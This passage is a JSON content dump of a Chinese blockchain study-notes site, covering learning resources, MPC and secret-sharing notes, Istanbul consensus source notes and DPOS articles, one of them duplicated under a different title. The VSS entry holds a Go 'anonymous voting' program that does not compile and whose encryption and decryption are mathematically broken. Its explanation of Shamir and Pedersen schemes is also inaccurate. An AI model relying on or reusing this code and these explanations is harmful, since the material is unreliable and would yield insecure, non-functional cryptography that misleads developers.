L2的交易都是先进先出方式。"},"blockchainguide/Learning_Roadmaps_And_Resources/相关学习资料（路线图和资料持续更新，建议关注）":{"slug":"blockchainguide/Learning_Roadmaps_And_Resources/相关学习资料（路线图和资料持续更新，建议关注）","filePath":"blockchainguide/Learning_Roadmaps_And_Resources/相关学习资料（路线图和资料持续更新，建议关注）.md","title":"相关学习资料（路线图和资料持续更新，建议关注）","links":[],"tags":[],"content":"学习资料\n初阶和中阶：\n\n炼就纯熟区块链开发技能，看这一篇就够了\n新人必读：区块链实用型技能树\nFISCO BCOS开源文档（概念、安装部署、应用开发部分）\nSolidity智能合约（中文）（注意选择对应版本）\n《鸟哥的linux私房菜》（系列）\n《UNIX网络编程》（系列）\n《Java核心技术》（系列）\n《Springboot实战》\n《Spring实战》\n\n高阶：\n\n因为是前沿方向，此部分建议基于中阶的资料深入研究，并基于开源项目去研读代码，进行实践，或者研读相关领域顶会论文。\n阅读各部委等权威机构定期出版的区块链白皮书和蓝皮书，跟踪权威媒体的行业新闻，了解行业动态。\n同时，但凡到了高阶阶段，搜寻资料，深入研究的方法应已经成型，无需过多推荐。\n"},"blockchainguide/Privacy_Computing/ZK/ZK-资料整理":{"slug":"blockchainguide/Privacy_Computing/ZK/ZK-资料整理","filePath":"blockchainguide/Privacy_Computing/ZK/ZK 资料整理.md","title":"ZK 资料整理","links":[],"tags":[],"content":"learnblockchain.cn/maps/ZKP![zk图谱](p.ipic.vip/5jxji9.jpg)"},"blockchainguide/Privacy_Computing/安全多方计算/可验证秘密共享VSS":{"slug":"blockchainguide/Privacy_Computing/安全多方计算/可验证秘密共享VSS","filePath":"blockchainguide/Privacy_Computing/安全多方计算/可验证秘密共享VSS.md","title":"可验证秘密共享VSS","links":[],"tags":[],"content":"【导读】在多方计算领域中，可验证秘密共享是一种基础的技术。它通过将秘密数据分割成多份，然后传输给不同的参与者，从而实现了数据的分布式存储和处理。可验证秘密共享的核心是验证机制，确保每个参与者提交的信息都是真实有效的。本文将详细介绍可验证秘密共享的原理、应用和发展。\n1. 可验证秘密共享简介\n可验证秘密共享（Verifiable Secret Sharing，简称VSS）是一种多方计算的基础技术，用于保护秘密数据在分布式环境中的安全存储和处理。它的核心思想是将秘密数据分割成多份，并将这些份分别发送给多个参与者。只有在满足特定条件时，才能够重构出完整的秘密。其中，特定的条件通常是指需要至少有一定数量的参与者协同合作，才能够完成秘密的还原。\n在这个过程中，主要存在两个问题：第一个问题是如何保证每个参与者都获得了正确的信息；第二个问题是如何保证每个参与者不会造假和欺骗。为了解决这些问题，可验证秘密共享引入了验证机制来确保数据的可靠性和正确性。\n2. 可验证秘密共享的原理\n下面我们来具体介绍可验证秘密共享的实现原理。它主要包含以下三个步骤：\n2.1 秘密数据的分割\n在这个阶段，将秘密数据分成多个部分，并将每个部分分别发送给不同的参与者。例如，如果有5个参与者，则可以将秘密数据分成5份发送给他们。被分割的秘密数据需要满足一个很重要的条件：任意k份数据都能够还原出完整的秘密信息，而少于k份则无法还原。\n秘密数据分割的过程通常分为两个步骤：首先，随机生成一些参数和值，然后借助运算符将秘密数据进行分割。其中的运算符可以是加法、乘法等，在这里就不做具体说明了。\n2.2 验证阶段\n在这个阶段，验证机制会检查每个参与者提交的信息是否合法和真实有效。同时，还会检查参与者之间的通信是否正常和流畅。\n典型的验证方法有两种：一种是根据Shamir秘密共享方案，这种方法验证了投票参与者提交的信息；另一种是根据Pedersen秘密共享方案，它验证投票参与者的身份。\n2.3 秘密数据的重构\n在前两个步骤完成之后，如果所有条件都满足，则可以通过协同合作来还原出完整的秘密数据。具体操作方式是：将每个参与者提交的信息进行汇总，并通过特定的计算方式计算出原始的秘密数据。\n需要注意的是，秘密数据的重构必须要满足以下条件：首先，只有在至少k份数据到达之后，才能够还原出全部秘密信息；其次，当数据集合小于k时，不能推导出任何关于秘密信息的新信息。\n3. 可验证秘密共享的应用\n可验证秘密共享在多方计算领域中有着广泛的应用，下面我们主要介绍以下两类应用：\n3.1 匿名投票\n匿名投票是指在不暴露个人隐私情况下进行投票。这种方式通常使用可验证秘密共享技术来实现，具体的过程如下：\n\n将选票加密并分发给每个投票参与者；\n参与者将其所持有的选票公开，并进行提交；\n验证机制检查每个参与者提交的信息是否合法和真实有效；\n如果所有条件都满足，则可以根据协同合作的方式进行选票统计。\n\n3.2 身份认证\n身份认证是指验证参与者身份是否合法。这种方式通常使用可验证秘密共享技术来实现，具体的过程如下：\n\n首先，每个参与者需要提供一个加密身份信息。\n系统管理员选择一些随机数，并将他们分配给每个参与者，每个参与者都只知道自己的值。\n然后，系统管理员会对每个参与者的加密身份信息进行验证。\n最后，如果所有条件都满足，则可以确定每个参与者的身份是否合法。\n\n4. 可验证秘密共享的发展\n随着多方计算技术的不断发展，可验证秘密共享也在不断壮大。目前，它已经广泛应用于匿名投票、身份认证、保密计算、安全传输等领域。随着科技的进步，未来还将有更多的应用场景涉及到可验证秘密共享技术。\n除此之外，研究人员也在不断探索新的可验证秘密共享技术。例如，利用区块链技术来构建一个去中心化可验证秘密共享方案；又例如，利用深度学习算法来构建一个更加智能的投票验证机制。\n总之，可验证秘密共享是一种基础的多方计算技术，在保护数据的隐私性和安全性方面发挥着重要作用。通过不断地研究和发展，相信它能够在更多的领域中得到广泛应用和推广。\n匿名投票\n基本思路\n好的，以下是使用Go语言实现匿名投票和可验证秘密共享技术的基本思路和步骤：\n \n设计投票问题和选项\n首先需要设计投票的问题和选项，这通常可以在前端界面上完成。为了保证匿名性，投票问题和选项不应包含任何能够识别个人身份信息的内容。\n \n生成私钥和公钥\n使用可验证秘密共享技术，需要生成一个私钥和公钥对。私钥只有投票管理员知道，它用于加密和解密结果。公钥可以公开发布，用于让参与者进行加密操作。\n \n向参与者分发公钥\n将公钥发送给所有想要参与投票的人，并要求他们使用该公钥对选择的选项进行加密。\n \n收集投票\n收集所有已经加密的选票，然后解密投票并计算结果。这样做的方法是，对每个选项，使用私钥解密它所对应的所有投票，然后将它们相加得到该选项的总票数。\n \n实现可验证性\n对于可验证性，我们需要确保：(a) 参与者不能看到其他人的投票；(b) 每个人只能投票一次；(c) 投票结果经过验证的。这些挑战都可以借助可验证秘密共享技术来克服。\n \n意外情况处理\n为了应对不同的意外情况，例如某个参与者无法完成投票、恶意攻击等，我们需要在代码中实现相应的异常处理机制。\npackage main\n \nimport (\n    &quot;crypto/rand&quot;\n    &quot;fmt&quot;\n    &quot;math/big&quot;\n)\n \nconst (\n    KeySize = 256 //密钥长度，以位为单位\n)\n \ntype KeyPair struct {\n    privateKey *big.Int //私钥\n    publicKey  *big.Int //公钥\n}\n \ntype Option struct {\n    Name   string //选项名称\n    Votes  int    //选项得票数\n    Result bool   //选项结果\n}\n \nfunc main() {\n    //生成密钥对\n    keyPair := generateKeyPair()\n \n    //模拟参与者进行投票，这里只模拟两个人投了不同的选项\n    encryptedVote1, err := encryptVote(keyPair.publicKey, []byte(&quot;Option A&quot;))\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    encryptedVote2, err := encryptVote(keyPair.publicKey, []byte(&quot;Option B&quot;))\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    encryptedVotes := [][]byte{encryptedVote1, encryptedVote2}\n \n    //计算结果\n    options := []Option{\n        {Name: &quot;Option A&quot;, Votes: 0, Result: false},\n        {Name: &quot;Option B&quot;, Votes: 0, Result: false},\n    }\n    for _, encryptedVote := range encryptedVotes {\n        decryptedVote, err := decryptVote(keyPair.privateKey, encryptedVote)\n        if err != nil {\n            fmt.Println(err)\n            return\n        }\n        for i := range options {\n            if options[i].Name == string(decryptedVote) {\n                options[i].Votes++\n                break\n            }\n        }\n    }\n \n    //验证结果\n    if verifyResults(options) {\n        announceResults(options)\n    } else {\n        handleError()\n    }\n}\n \n//生成密钥对\nfunc generateKeyPair() KeyPair {\n    privateKey, err := rand.Prime(rand.Reader, KeySize) //在指定长度下生成大素数作为私钥\n    if err != nil {\n        panic(err)\n    }\n    publicKey := new(big.Int).Exp(big.NewInt(2), privateKey, nil) //计算公钥，即2的私钥次方\n    return KeyPair{privateKey: privateKey, publicKey: publicKey}\n}\n \n//加密选票\nfunc encryptVote(publicKey *big.Int, vote []byte) ([]byte, error) {\n    r, err := rand.Int(rand.Reader, publicKey)\n    if err != nil {\n        return nil, err\n    }\n    m := new(big.Int).SetBytes(vote)\n    c1 := new(big.Int).Exp(big.NewInt(2), r, publicKey)\n    c2 := m.Mul(m, c1)\n    return c2.Bytes(), nil\n}\n \n//解密选票\nfunc decryptVote(privateKey *big.Int, encryptedVote []byte) ([]byte, error) {\n    c2 := new(big.Int).SetBytes(encryptedVote)\n    c1 := new(big.Int).Exp(c2, privateKey, nil)\n    m := c2.Mul(c2, new(big.Int).ModInverse(c1, privateKey))\n    return m.Bytes(), nil\n}\n \n//验证结果\nfunc verifyResults(options []Option, encryptedVotes [][]byte, publicKey *big.Int) bool {\n    //检查是否存在重复投票\n    voteMap := make(map[string]bool)\n    for _, encryptedVote := range encryptedVotes {\n        decryptedVote, err := decryptVote(keyPair.privateKey, encryptedVote)\n        if err != nil {\n            fmt.Println(err)\n            return false\n        }\n        vote := string(decryptedVote)\n        if voteMap[vote] {\n            //存在重复投票\n            return false\n        }\n        voteMap[vote] = true\n    }\n \n    //检查选票是否经过公钥加密\n    for _, encryptedVote := range encryptedVotes {\n        c2 := new(big.Int).SetBytes(encryptedVote)\n        m := new(big.Int).Exp(c2, privateKey, publicKey)\n        if m.Cmp(big.NewInt(1)) &lt;= 0 || m.Cmp(publicKey) &gt;= 0 {\n            //选票未经过公钥加密\n            return false\n        }\n    }\n \n    return true\n}\n \n//宣布结果\nfunc announceResults(options []Option) {\n    for _, option := range options {\n        fmt.Printf(&quot;%s: %d\\n&quot;, option.Name, option.Votes)\n    }\n}\n \n//处理错误\nfunc handleError() {\n    fmt.Println(&quot;Error occurred during vote counting and verification.&quot;)\n}"},"blockchainguide/Privacy_Computing/安全多方计算/安全多方计算学习路径":{"slug":"blockchainguide/Privacy_Computing/安全多方计算/安全多方计算学习路径","filePath":"blockchainguide/Privacy_Computing/安全多方计算/安全多方计算学习路径.md","title":"安全多方计算学习路径","links":[],"tags":[],"content":"\n学习基础知识：\n\n学习密码学基础，包括对称加密、非对称加密、哈希函数、数字签名等。\n了解安全多方计算的基本概念，如隐私保护、安全计算、安全性定义等。\n学习安全多方计算的应用场景，例如隐私保护的数据挖掘、保密投票等。\n\n\n阅读经典论文和书籍：\n\n阅读 Andrew Yao 的经典论文 “Protocols for secure computations”，了解两方安全计算的最早理论。\n阅读书籍 “Secure Multiparty Computation and Secret Sharing”（作者：Ronald Cramer, Ivan Damgård 和 Jesper Buus Nielsen），了解安全多方计算的基本理论和技术。\n应用密码学》(Applied Cryptography) by Bruce Schneier\n《密码学基础》(Cryptography: Theory and Practice) by Douglas R. Stinson\n《密码学的数学基础》(Mathematical Foundations of Public Key Cryptography) by Richard A. Mollin\n《密码学导论》(Introduction to Cryptography) by Johannes A. Buchmann\n\n\n学习安全多方计算的核心协议：\n\n学习 Yao 的加密电路（Yao’s Garbled Circuits）协议，了解如何使用加密电路进行两方安全计算。\n学习 BGW（Ben-Or, Goldwasser, and Wigderson）协议和 GMW（Goldreich, Micali, and Wigderson）协议，了解多方安全计算的基本框架。\n学习 Shamir’s Secret Sharing 和 Additive Secret Sharing 等秘密共享方案，理解如何将数据分割成多份以实现安全计算。\n\n\n探索高效的安全多方计算技术：\n\n了解 Oblivious Transfer（OT）和 Oblivious RAM（ORAM）等隐私保护技术，探究它们在安全多方计算中的应用。\n学习全同态加密（FHE）和部分同态加密（PHE）方案，了解它们如何实现安全计算。\n探索零知识证明（ZKP）技术，了解其在保护隐私计算中的应用。\n\n\n学习实用的安全多方计算框架和工具：\n\n学习开源框架，如 Sharemind、MP-SPDZ、FRESCO 等，了解它们的设计理念和使用方法。\n学习如何使用这些框架进行安全多方计算实验，例如实现安全的线性回归、神经网络计算等。\n\n\n安全多方计算应用\n\n隐私保护\n数据合作计算\n安全投票\n\n\n"},"blockchainguide/Privacy_Computing/安全多方计算/秘密分享SSS":{"slug":"blockchainguide/Privacy_Computing/安全多方计算/秘密分享SSS","filePath":"blockchainguide/Privacy_Computing/安全多方计算/秘密分享SSS.md","title":"秘密分享SSS","links":[],"tags":[],"content":""},"blockchainguide/Privacy_Computing/安全多方计算/门限签名方案TSS":{"slug":"blockchainguide/Privacy_Computing/安全多方计算/门限签名方案TSS","filePath":"blockchainguide/Privacy_Computing/安全多方计算/门限签名方案TSS.md","title":"门限签名方案TSS","links":[],"tags":[],"content":"大致理解\n首先每个人各自生成自己的私钥片段uᵢ并秘密地保存起来，假设是2-of-3方案，那么缺少一方也可以恢复完整私钥\n门限密钥生成\n去中心化的为每个参与者生成私钥碎片\n门限签名\n私钥碎片签名出签名碎片，然后可以拼接成完整私钥的完整签名\n参考\n门限签名"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/BFT-协议整体看法":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/BFT-协议整体看法","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/BFT 协议整体看法.md","title":"BFT 协议整体看法","links":[],"tags":[],"content":"基于协约\nPBFT\nchain协议\nring协议\nBFT-Smart协议\n\nwww.cnblogs.com/Evsward/p/bft-smart.html\nzhuanlan.zhihu.com/p/101270841\n\nZyzzyva\n\nsosp2007.org/papers/sosp052-kotla.pdf\nwww.jianshu.com/p/b4674d3f7ebd\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/istanbul共识源码分析":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/istanbul共识源码分析","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/istanbul共识源码分析.md","title":"istanbul共识源码分析","links":[],"tags":[],"content":"handler.go （处理消息）\nstart\n\nstartNewRound(common.Big0)\nsubscribeEvents()\nhandleEvents()\n\nistanbul.RequestEvent{}\nistanbul.MessageEvent{}\nbacklogEvent{}\ntimeoutEvent{}\nistanbul.FinalCommittedEvent{}\n\n\n\nstop\n\nroundChangeTimer.Stop()\nunsubscribeEvents()\n\nevents.Unsubscribe()timeoutSub.Unsubscribe()\nfinalCommittedSub.Unsubscribe()\n\n\n使得handler处于wait状态\n\nhandleMsg&amp;handleTimeoutMsg\n\n先进行msg的check\n如果是futureMsg，直接存储并returnErr\n接下来处理4个msg\n\nstartNewRound\n\n\n首先设置roundChange 为false，如果最新的proposer和proposal不存在，直接return\n\n\n第二个步骤有几个if else 需要拆解（TODO）\n\n\n如果roundChange为true，新建一个View，如果为false，sequence加1\n\n\n选出proposer（CalcProposer），根据valset、lastprotser、round进行选择\n\n\n设置状态为接收请求c.setState(StateAcceptRequest)。\n\n\n发送istanbul.RequestEvent（把proposal扔出去）\n\n\n处理积压消息（Preprepare）\n\n\n发送backlogEvent事件\n\n\nendPreprepare：\n\n\n如果自己是proposer并且和proposal有着相同的sequence，那就广播preprepare消息\n\n\n广播途中将消息转换成payload 并返回\n\n\n\n\nhandlePreprepare\n\n校验message ，如果是老的prepare消息，要commit 这个proposal,直接会到广播comiit消息\n校验消息来自当前的proposer\n校验我们接收到的proposal\n\ncheck 坏块\ncheck block body(rehash)\nverifyHeader (TODO,重点了解)\n\n\n校验之后，（TODO，逻辑？）\n\n\n如果锁定的proposal和接收到的proposal不一致就sendNextRoundChange，如果一样，就接收prepare消息并设置状态为StatePreprepared并且发送commit消息\n\nhandleCommit\n\ncheckMessage\nverifyCommit\nacceptCommit(添加到commits中)\n有了足够的commit messages并且不是comiited状态将commit proposal\nCommit\n\n设置状态为comitted\n创建commitSeals\n进入最终的commit代码\n\n校验proposal是一个有效块\nseals写入到extra-data中（writeCommittedSeals 关键代码）\n更新block的header\n如果proposedBlockHash == commitedBlockHash ,那么就把block 扔到commitCh中去seal并且等待seal结果（这是proposer才会走的通道），直接返回；如果不一样，直接塞入到enqueue中（sb.broadcaster.Enqueue(fetcherID, block)）\n\n\n\n\n\nhandleRoundChange\n\ncheckMessage\nroundChangeSet 添加消息\n只要达到了F+1个roundChange就构成了一个weak proof ,就可以检查此时的round是否比我们的round小，如果小就CatchUp,然后startNewRound（需要2F+1）\n\nengine.go\nprepare\n准备header\n\n\nsb.snapshot\n\n\n从candidates中随机设置coinbase\n\n\nprepareExtra（将快照中的validators添加到extraData的validators中），payload 数据就是编码后的IstanbulExtra，作为extra\n\ntypes.IstanbulExtra{\n   Validators:    vals,\n   Seal:          []byte{},\n   CommittedSeal: [][]byte{},\n}\n\n\n\nFinalizeAndAssemble\n运行交易后状态更改，组装成最终的block\nseal\n生成一个新块放入给定通道\n\n主块判断是否是validator，子链还必须判断是不是子validator\n更新块（updateBlock），proposer用自己的私钥给块签名生成seal，并写入IstanbulExtra的seal中，包括自己的签名的标记和其他人签名的标记，其实就是返回带签名的块\n把块丢到共识引擎中，通过事件istanbul.RequestEvent传播，从而进入到handleRequest，开启sendPrepeare，result等待的就是sb.commitCh中的数据\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_DPOS算法-4":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_DPOS算法-4","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_DPOS算法-4.md","title":"死磕共识算法_DPOS算法-4","links":[],"tags":[],"content":"\n死磕共识算法|DPOS(委托股权证明)算法\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n\nDPOS详解\nDPoS共识算法就是将PoS共识算法中的记账者转换为指定节点数组成的小圈子，而不是所有人都可以参与记账，这个圈子可能是21个节点，也有可能是101个节点，只有圈子内的节点才能获得记账权。这将极大地提高系统的吞吐量，因为更少的节点也就意味着网络和节点的可控。\nDPOS的股东选举机制：\n\nDPoS机制中的股民（节点）根据自己持有的加密货币数量占总量的百分比（占股比例）来投票，不是一人一票；\n选举出的股东代表（可信节点）完全对等，可理解为具有同等算力的101个矿池；\n股东代表一旦无能、不作为、胡作为（提供的算力不稳定，计算机宕机、或者试图利用手中的权力作恶），将立刻被股民踢出整个系统，然后由其他后备代表顶上去；\n决策完公司大事（记完账、出完块）有钱分，根据占股比例。\n\nDPOS算法分析\n在DPoS共识算法中，区块链的正常运转依赖于见证人(Delegates)，见证人是由全网节点投票产生的，见证人也是记账节点的实际控制人，相当于咱们选课代表，课代表帮我们整理作业\n见证人在完成打包交易的同时可以领取区块奖励和交易的手续费，并且可以执行社区投票的提案，所以DPoS共识算法不仅仅是算法，而是一个包含了协作治理关系的共识机制。\nDPoS为了尽快确定交易顺序，过滤无效交易，所以规定了在正常情况下，所有记账节点轮流每3秒产生一个区块，轮到了某个记账节点出块时，必须在2秒内提交区块，否则就会错块。\n假设一直没有记账节点错过自己顺序，那么他们生产的链条势必是最长的链条，如果记账节点在非指定时间生产区块被认为是无效的，每经过一轮，所有节点轮流出块的顺序就会发生重新洗牌。\n下图就是一个理想的轮流记账状态：\n\nDPoS算法白皮书还介绍了以下几种不正常的情况：\n①：少数记账节点发起恶意分叉或者发生故障\n可以允许最多1/3的节点是恶意或故障，从而导致出现分叉。在这种情形下，少数分支将只能在9秒内生产1个块，而大多数分支，由于数量多一倍，将预期能在9秒内生产2个块。再一次，诚实的2/3的大多数可以比小的那一部分创建一个更长的链条。\n\n②：隔离环境下的重复块生产\n少数群体可能尝试创建一个无限数量的分叉，但所有分支都将比主链短，因为少数群体在链的成长上更慢。\n\n③：网络碎片\n网络非常有可能碎片到，没有哪一个链上的区块生产者占到了所有区块生产者中的大多数。在此情景下，最长的那个链将变成最大的一个少数群体。当网络连接恢复正常后，相对较小的那些群体将自然的切换到最长的链，从而将恢复明确的共识。\n\n还有一种非常可能的情况是，三个分支中，最大的两个分支一样大。此时，将由相对更小的第三个分支加入网络时来打破僵局。存在奇数个区块生产者，所以僵局一般不会持续很久。后面我们还将介绍区块生产者的清洗，会将生产者随机生成顺序，以确保即使两个分支具有相同数量的生产者，分支也将以不同的长度爆发增长，导致一个分支最终接管另一个分支。\n④：少数群体重复生产\n在这种情景下，少数群体B在自己可以生产的时间节点，同时创建两条，或多条的区块链。下一个执行的生产者C，将选择B创建的可选链中的任一条。C选中的这条链将成为最长的链，当这发生是，所以如下图所示的B1链条上的结点都会转过来。所以，无论少数做恶结点制造多少的链，他们在下一轮中，肯定不会是最长的那个链。\n\n⑤：最后的不可逆区块\n在网络碎片的情况下，多个分叉可能持续较长时间的隔离。长远来看，最长的链将最终受到认可。但观察者需要一种手段来确定某个块是否是在最长链条的一部分（确认共识）。这可以通过2/3 + 1个区块生产者是否对某个块有确认。\n下图中，块B被A、C确认了，这意味着2/3 + 1都已经确认了。由此我们可以为不可能存在更长的链了，因为2/3的区块链是诚实。\n\n需要注意的是这个规则与比特币的6个区块确认类似。一些聪明的人可以设计一系列事件，其中两个节点可能会在不同的最后不可逆块上结束。这种极端情况需要一个攻击者，精确控制通信延迟，并需要在几分钟内实施不止一次，而是二次攻击。如果发生这种情况，那么最长链条这一长期规则仍然适用。 我们估计这种攻击的可能性足够接近0，经济后果也微不足道，不值得担心。\n⑥：不足法定区块生产者\n在一些不太可能的情况下，生产者没有明确达到法定人数，少数人可能继续生产块。在继续生产的区块中，利益相关者可以包含一些改变投票的交易。这些投票会选举一组新的区块生产者，并将区块生产参与度恢复到100%。一旦发生这种情况，少数人链最终会超过其它低于100%参与链。\n在这个流程发生时，所有的观察者必须要明白整个网络处于不稳定的状态，直到多于67%参与者出现后才会稳定下来。哪些选择在这种情景下发起交易的，与那些在比特币中接受低于6块就确认交易成功那样，冒着类似的风险。他们必须明白，存在某些情况下，共识最终会以另一个链为准。在实践中，这种情形比在比特币中接受少于3个块就确认更加安全。\n⑦：大多数据区块生产者的腐败\n如果大多数区块生产者合谋变得腐败，他们制造无限数量的分支，每一个分支都有多于2/3的大多数的签名。在这样的场景早，最后不可逆转块算法退化为最长链算法。此时最长的，获得了最大的群体认证的，将由少数的诚实节点的加入来确定。这样的情形不会持续很久，因为利益相关者会最终投票替换掉这些区块生产者。\n\nDPOS要解决的问题\n从名称上，我们也可以判断出DPoS与PoS共识是直接关联的。DPoS算法是BM根据当时PoW、PoS的不足而改进的共识算法，它的目的就是为了提高性能，也就是交易确认时间短。\n在PoS共识中，人们使用财产证明来“挖矿”，也就是说，这是任何人都可以参与的，只要你持有币，你就可以参与挖矿。但是PoS并没有解决性能问题，在这里我们直接认为提高性能就是提高TPS，如下：\n\n　　　　TPS = transactions / block_time\n\nTPS表示区块链每秒能确认的交易数， transactions 是由区块大小block_size和平均每笔交易大小决定的，而区块大小受全网网络状态network_bandwidth 限制，也是由记账节点之间物理带宽witness_performance决定的。\n记账节点的个数witness_count直接决定了物理带宽的上限，因为记账节点数量越多，则对物理带宽要求越高，对网络的稳定性要求也越高。\n要注意的一点是在DPoS中，记账节点不叫做矿工，而是改称为见证人，Witness。所以这个公式变成了下面的样子：\n\nTPS = (block_size_network_bandwidth witness_performance)/(block_time * witness_count)\n\n我们可以看到，要提高TPS，可以增大区块大小block_size、提升记账节点网络带宽network_bandwidth、提升记账节点处理性能witness_performance，减小区块时间block_time、减小记账节点数量witness_count。\n分子项我们可以看到，它基本受限于物理资源的上限，目前工业水平制造的物理资源的使用上限基本就是整个项的上限了，所以可操作性不大。\n而分母项是由共识算法决定的，所以我们从区块时间，以及记账节点数入手，DPoS算法便正是从这两项着手的。\n首先改动的便是限制记账节点的数量，也就是见证人的数量。\n我们在PoW和PoS中可以看到，成为记账节点是无需门槛的，你可以随时参与挖矿，随时退出。\n那这会带来什么问题呢，首先无法确定记账节点的数量，其次无法确定记账节点之间的网络环境，记账节点数越多网络环境越复杂，这些不确定性会增大网络分区的概率，从而导致区块链分叉。\n如果我们事先规定好记账节点的数量，接着让全网所有节点可以投票决定哪些节点可以成为记账节点，这样就限制并减小了分母项witness_count，这个过程我们也称作投票选举。\n因为记账节点数量不多，那么我们可以在共识算法中可以规定出块时间为一个固定值，这个值可以很小，通过轮流出块的方式来进行记账。\n以上思路基本就是DPoS的基本设计思路，BM还为DPoS算法确立两个原则：\n\n投票选举过程一定要保证最大权益所有者最终能控制全网，因为一旦出了问题，他们的损失最大；\n与PoW、PoS一样，所有节点仅承认“最长”链。\n\n这两个原则确立了DPoS共识的基本特性，第一条放大了PoS共识使用者就是记账者的优点，第二点则规定了分叉时系统应该表现的行为。\n\n参考\n\ngithub.com/blockchainGuide\neth.wiki/en/concepts/casper-proof-of-stake-compendium\neth.wiki/en/concepts/casper-proof-of-stake-compendium\neth.wiki/en/concepts/proof-of-stake-faqs\n"},"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_EOS_DPOS_BFT算法-5":{"slug":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_EOS_DPOS_BFT算法-5","filePath":"blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_EOS_DPOS_BFT算法-5.md","title":"死磕共识算法_EOS_DPOS_BFT算法-5","links":[],"tags":[],"content":"\n死磕共识算法|DPOS(委托股权证明)算法\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\n\nDPOS详解\nDPoS共识算法就是将PoS共识算法中的记账者转换为指定节点数组成的小圈子，而不是所有人都可以参与记账，这个圈子可能是21个节点，也有可能是101个节点，只有圈子内的节点才能获得记账权。这将极大地提高系统的吞吐量，因为更少的节点也就意味着网络和节点的可控。\nDPOS的股东选举机制：\n\nDPoS机制中的股民（节点）根据自己持有的加密货币数量占总量的百分比（占股比例）来投票，不是一人一票；\n选举出的股东代表（可信节点）完全对等，可理解为具有同等算力的101个矿池；\n股东代表一旦无能、不作为、胡作为（提供的算力不稳定，计算机宕机、或者试图利用手中的权力作恶），将立刻被股民踢出整个系统，然后由其他后备代表顶上去；\n决策完公司大事（记完账、出完块）有钱分，根据占股比例。\n\nDPOS算法分析\n在DPoS共识算法中，区块链的正常运转依赖于见证人(Delegates)，见证人是由全网节点投票产生的，见证人也是记账节点的实际控制人，相当于咱们选课代表，课代表帮我们整理作业\n见证人在完成打包交易的同时可以领取区块奖励和交易的手续费，并且可以执行社区投票的提案，所以DPoS共识算法不仅仅是算法，而是一个包含了协作治理关系的共识机制。\nDPoS为了尽快确定交易顺序，过滤无效交易，所以规定了在正常情况下，所有记账节点轮流每3秒产生一个区块，轮到了某个记账节点出块时，必须在2秒内提交区块，否则就会错块。\n假设一直没有记账节点错过自己顺序，那么他们生产的链条势必是最长的链条，如果记账节点在非指定时间生产区块被认为是无效的，每经过一轮，所有节点轮流出块的顺序就会发生重新洗牌。\n下图就是一个理想的轮流记账状态：\n\nDPoS算法白皮书还介绍了以下几种不正常的情况：\n①：少数记账节点发起恶意分叉或者发生故障\n可以允许最多1/3的节点是恶意或故障，从而导致出现分叉。在这种情形下，少数分支将只能在9秒内生产1个块，而大多数分支，由于数量多一倍，将预期能在9秒内生产2个块。再一次，诚实的2/3的大多数可以比小的那一部分创建一个更长的链条。\n\n②：隔离环境下的重复块生产\n少数群体可能尝试创建一个无限数量的分叉，但所有分支都将比主链短，因为少数群体在链的成长上更慢。\n\n③：网络碎片\n网络非常有可能碎片到，没有哪一个链上的区块生产者占到了所有区块生产者中的大多数。在此情景下，最长的那个链将变成最大的一个少数群体。当网络连接恢复正常后，相对较小的那些群体将自然的切换到最长的链，从而将恢复明确的共识。\n\n还有一种非常可能的情况是，三个分支中，最大的两个分支一样大。此时，将由相对更小的第三个分支加入网络时来打破僵局。存在奇数个区块生产者，所以僵局一般不会持续很久。后面我们还将介绍区块生产者的清洗，会将生产者随机生成顺序，以确保即使两个分支具有相同数量的生产者，分支也将以不同的长度爆发增长，导致一个分支最终接管另一个分支。\n④：少数群体重复生产\n在这种情景下，少数群体B在自己可以生产的时间节点，同时创建两条，或多条的区块链。下一个执行的生产者C，将选择B创建的可选链中的任一条。C选中的这条链将成为最长的链，当这发生是，所以如下图所示的B1链条上的结点都会转过来。所以，无论少数做恶结点制造多少的链，他们在下一轮中，肯定不会是最长的那个链。\n\n⑤：最后的不可逆区块\n在网络碎片的情况下，多个分叉可能持续较长时间的隔离。长远来看，最长的链将最终受到认可。但观察者需要一种手段来确定某个块是否是在最长链条的一部分（确认共识）。这可以通过2/3 + 1个区块生产者是否对某个块有确认。\n下图中，块B被A、C确认了，这意味着2/3 + 1都已经确认了。由此我们可以为不可能存在更长的链了，因为2/3的区块链是诚实。\n\n需要注意的是这个规则与比特币的6个区块确认类似。一些聪明的人可以设计一系列事件，其中两个节点可能会在不同的最后不可逆块上结束。这种极端情况需要一个攻击者，精确控制通信延迟，并需要在几分钟内实施不止一次，而是二次攻击。如果发生这种情况，那么最长链条这一长期规则仍然适用。 